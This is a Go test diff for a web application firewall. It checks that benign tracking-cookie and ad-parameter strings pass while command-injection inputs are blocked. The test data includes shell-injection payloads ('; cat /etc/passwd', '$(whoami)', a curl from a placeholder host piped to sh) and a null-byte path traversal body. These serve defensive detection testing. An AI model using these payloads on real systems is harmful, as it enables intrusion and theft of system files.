@@ -66,3 +66,40 @@ func TestBypassesFound2026(t *testing.T) {
 		}
 	}
 }
+
+// Real tracking cookies and ad parameters that tripped CMDI-001 and NULL-001
+// (open-appsec dataset); shell commands must still be caught.
+func TestRealTrafficNotCommands(t *testing.T) {
+	rules, _ := LoadRules("")
+	e := NewEngine(rules, 5)
+	check := func(q string) Decision {
+		r := httptest.NewRequest("GET", "/x?q="+url.QueryEscape(q), nil)
+		return e.Inspect(r, nil)
+	}
+	for _, n := range []string{
+		"true|ts:1719928199526|id:019073b58aca002fc6f",
+		"typ=organic|||src=google|||mdm=(none)|||trm=(none)|||id=(none)",
+		"u1=s product details pg;id=sku2680263",
+		"src=4448269;type=bbycom;cat=bby-s0;ord=87704573",
+	} {
+		if d := check(n); d.Attack {
+			t.Errorf("false alarm: %q %v", n, d.Matches)
+		}
+	}
+	for _, a := range []string{"x|id", "x; cat /etc/passwd", "$(whoami)", "a`id`", "x|cat${IFS}/etc/passwd", "x;ls -la", "x && curl http://e.example/s | sh"} {
+		if d := check(a); !d.Attack {
+			t.Errorf("not blocked: %q", a)
+		}
+	}
+	// A binary body (protobuf, gzip) has zero bytes; a text body with one is suspicious.
+	bin := httptest.NewRequest("POST", "/collect", nil)
+	bin.Header.Set("Content-Type", "application/octet-stream")
+	if d := e.Inspect(bin, []byte("\x08\x96\x01\x00\xff\xfe\x00\x12")); d.Attack {
+		t.Errorf("binary body blocked: %v", d.Matches)
+	}
+	txt := httptest.NewRequest("POST", "/upload", nil)
+	txt.Header.Set("Content-Type", "text/plain")
+	if d := e.Inspect(txt, []byte("file=../secret.txt\x00.png")); !d.Attack {
+		t.Error("null byte in a text body must still block")
+	}
+}
